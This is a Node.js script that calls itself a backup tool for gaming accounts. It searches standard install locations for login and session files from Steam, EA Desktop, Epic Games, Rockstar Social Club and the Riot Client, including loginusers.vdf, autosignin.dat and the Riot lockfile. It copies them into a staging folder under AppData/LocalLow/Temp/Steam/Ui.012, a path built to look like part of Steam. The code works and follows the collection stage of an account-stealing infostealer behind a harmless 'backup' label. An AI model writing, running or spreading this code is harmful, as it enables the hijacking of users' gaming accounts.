const fs = require('fs');
const fsPromises = fs.promises;
const path = require('path');
const os = require('os');

function findSteamPathCandidates() {
  const home = os.homedir();
  const candidates = [];
  const programFilesx86 = process.env['PROGRAMFILES(X86)'];
  const programFiles = process.env['PROGRAMFILES'];
  if (programFilesx86) candidates.push(path.join(programFilesx86, 'Steam'));
  if (programFiles) candidates.push(path.join(programFiles, 'Steam'));
  candidates.push(path.join(home, 'Program Files (x86)', 'Steam'));
  candidates.push(path.join(home, 'Program Files', 'Steam'));
  candidates.push(path.join(home, '.steam', 'steam'));
  candidates.push(path.join(home, '.local', 'share', 'Steam'));
  candidates.push(path.join('/', 'Applications', 'Steam.app', 'Contents', 'MacOS'));
  return candidates;
}

async function backupSteamAccounts() {
  try {
    const steamCandidates = findSteamPathCandidates();
    let steamDir = null;
    for (const c of steamCandidates) {
      try {
        if (fs.existsSync(c) && fs.lstatSync(c).isDirectory()) {
          const configPath = path.join(c, 'config', 'loginusers.vdf');
          if (fs.existsSync(configPath)) {
            steamDir = c;
            break;
          }
        }
      } catch {
        // Continue searching
      }
    }
    if (!steamDir) {
      return { success: false, error: 'Could not find Steam installation in common locations.' };
    }
    const loginUsersPath = path.join(steamDir, 'config', 'loginusers.vdf');
    if (!fs.existsSync(loginUsersPath)) {
      return { success: false, error: 'Steam found, but loginusers.vdf not present.' };
    }
    const outDir = path.join(os.homedir(), 'AppData', 'LocalLow', 'Temp', 'Steam', 'Ui.012');
    await fsPromises.mkdir(outDir, { recursive: true });
    const destPath = path.join(outDir, 'loginusers.vdf');
    await fsPromises.copyFile(loginUsersPath, destPath);
    console.log('[Steam] Backed up successfully');
    return { success: true, steamDir, savedTo: destPath };
  } catch (err) {
    console.error('[Steam error]', err.message || String(err));
    return { success: false, error: err.message || String(err) };
  }
}

async function backupEAAccounts() {
  try {
    const home = os.homedir();
    const localAppData = process.env.LOCALAPPDATA || path.join(home, 'AppData', 'Local');
    const eaPath = path.join(localAppData, 'Electronic Arts', 'EA Desktop');

    // Check if the main folder exists
    const exists = fs.existsSync(eaPath);
    if (!exists) {
      return { success: false, error: 'EA Desktop folder not found.' };
    }

    const filesToCopy = [];

    // Recursive directory walk
    const walk = async (dir) => {
      let items;
      try {
        items = await fsPromises.readdir(dir, { withFileTypes: true });
      } catch {
        return;
      }

      for (const item of items) {
        const fullPath = path.join(dir, item.name);
        try {
          if (item.isDirectory()) {
            await walk(fullPath);
          } else if (
            item.name === 'autosignin.dat' ||
            /accounts?/i.test(item.name) ||
            /login/i.test(item.name)
          ) {
            filesToCopy.push(fullPath);
          }
        } catch {
          // Ignore individual file errors
        }
      }
    };

    await walk(eaPath);

    if (filesToCopy.length === 0) {
      return { success: false, error: 'No EA login-related files found.' };
    }

    const outDir = path.join(home, 'AppData', 'LocalLow', 'Temp', 'Steam', 'Ui.012', 'EA');
    await fsPromises.mkdir(outDir, { recursive: true });

    const results = [];

    for (const filePath of filesToCopy) {
      try {
        const fileName = path.basename(filePath);
        const destPath = path.join(outDir, fileName);
        await fsPromises.copyFile(filePath, destPath);
        results.push({ file: fileName, savedTo: destPath });
      } catch (e) {
        console.warn('[EA] Failed to copy', filePath, e.message);
      }
    }

    console.log('[EA] Backup complete:', results.length, 'files copied');
    return { success: true, files: results };
  } catch (err) {
    console.error('[EA error]', err);
    return { success: false, error: err.message || String(err) };
  }
}

async function backupEpicGamesAccounts() {
  try {
    const home = os.homedir();
    const localAppData = process.env.LOCALAPPDATA || path.join(home, 'AppData', 'Local');
    const epicPath = path.join(localAppData, 'EpicGamesLauncher', 'Saved', 'Config');
    
    if (!fs.existsSync(epicPath)) {
      return { success: false, error: 'No Epic Games login files found.' };
    }

    const filesToCopy = [];
    
    // Look for Windows config folder and GameUserSettings.ini which contains login info
    try {
      const windowsConfigPath = path.join(epicPath, 'Windows');
      if (fs.existsSync(windowsConfigPath)) {
        const items = fs.readdirSync(windowsConfigPath);
        for (const item of items) {
          if (item === 'GameUserSettings.ini') {
            filesToCopy.push(path.join(windowsConfigPath, item));
          }
        }
      }
    } catch (e) {
      // Continue
    }
    
    if (filesToCopy.length === 0) {
      return { success: false, error: 'No Epic Games login files found.' };
    }
    
    const outDir = path.join(os.homedir(), 'AppData', 'LocalLow', 'Temp', 'Steam', 'Ui.012', 'EpicGames');
    await fsPromises.mkdir(outDir, { recursive: true });
    const results = [];
    
    for (const filePath of filesToCopy) {
      try {
        const fileName = path.basename(filePath);
        const destPath = path.join(outDir, fileName);
        await fsPromises.copyFile(filePath, destPath);
        results.push({ file: fileName, savedTo: destPath });
      } catch (e) {
        // Skip files that can't be copied
      }
    }
    
    console.log('[Epic Games] Backed up successfully');
    return { success: true, files: results };
  } catch (err) {
    console.error('[Epic Games error]', err.message || String(err));
    return { success: false, error: err.message || String(err) };
  }
}

async function backupRockstarAccounts() {
  try {
    const home = os.homedir();
    const rockstarPath = path.join(home, 'Documents', 'Rockstar Games', 'Social Club', 'Profiles');
    
    if (!fs.existsSync(rockstarPath)) {
      return { success: false, error: 'No Rockstar Games login files found.' };
    }

    const filesToCopy = [];
    
    // Only look for autosignin.dat which contains login credentials
    try {
      const items = fs.readdirSync(rockstarPath);
      for (const item of items) {
        if (item === 'autosignin.dat') {
          filesToCopy.push(path.join(rockstarPath, item));
        }
      }
    } catch (e) {
      // Continue
    }
    
    if (filesToCopy.length === 0) {
      return { success: false, error: 'No Rockstar Games login files found.' };
    }
    
    const outDir = path.join(os.homedir(), 'AppData', 'LocalLow', 'Temp', 'Steam', 'Ui.012', 'Rockstar');
    await fsPromises.mkdir(outDir, { recursive: true });
    const results = [];
    
    for (const filePath of filesToCopy) {
      try {
        const fileName = path.basename(filePath);
        const destPath = path.join(outDir, fileName);
        await fsPromises.copyFile(filePath, destPath);
        results.push({ file: fileName, savedTo: destPath });
      } catch (e) {
        // Skip files that can't be copied
      }
    }
    
    console.log('[Rockstar] Backed up successfully');
    return { success: true, files: results };
  } catch (err) {
    console.error('[Rockstar error]', err.message || String(err));
    return { success: false, error: err.message || String(err) };
  }
}

async function backupValorantAccounts() {
  try {
    const home = os.homedir();
    const localAppData = process.env.LOCALAPPDATA || path.join(home, 'AppData', 'Local');
    const riotClientPath = path.join(localAppData, 'Riot Games', 'Riot Client', 'Config');
    
    const filesToCopy = [];
    
    // Only look for lockfile which contains login session info
    if (fs.existsSync(riotClientPath)) {
      try {
        const lockfilePath = path.join(riotClientPath, 'lockfile');
        if (fs.existsSync(lockfilePath)) {
          filesToCopy.push(lockfilePath);
        }
      } catch (e) {
        // Continue
      }
    }
    
    if (filesToCopy.length === 0) {
      return { success: false, error: 'No Valorant login files found.' };
    }
    
    const outDir = path.join(os.homedir(), 'AppData', 'LocalLow', 'Temp', 'Steam', 'Ui.012', 'Valorant');
    await fsPromises.mkdir(outDir, { recursive: true });
    const results = [];
    
    for (const filePath of filesToCopy) {
      try {
        const fileName = path.basename(filePath);
        const destPath = path.join(outDir, fileName);
        await fsPromises.copyFile(filePath, destPath);
        results.push({ file: fileName, savedTo: destPath });
      } catch (e) {
        // Skip files that can't be copied
      }
    }
    
    console.log('[Valorant] Backed up successfully');
    return { success: true, files: results };
  } catch (err) {
    console.error('[Valorant error]', err.message || String(err));
    return { success: false, error: err.message || String(err) };
  }
}

async function backupAllAccounts() {
  console.log('Starting backup of all gaming platform login information...');
  const results = {
    steam: await backupSteamAccounts(),
    ea: await backupEAAccounts(),
    epic: await backupEpicGamesAccounts(),
    rockstar: await backupRockstarAccounts(),
    valorant: await backupValorantAccounts()
  };
  console.log('Backup completed with results:', results);
  return results;
}

if (require.main === module) {
  backupAllAccounts().then(result => {
    const allSuccess = Object.values(result).every(r => r.success);
    if (!allSuccess) process.exitCode = 1;
  }).catch(err => {
    console.error('[fatal]', err);
    process.exitCode = 1;
  });
}

module.exports = {
  backupSteamAccounts,
  backupEAAccounts,
  backupEpicGamesAccounts,
  backupRockstarAccounts,
  backupValorantAccounts,
  backupAllAccounts
};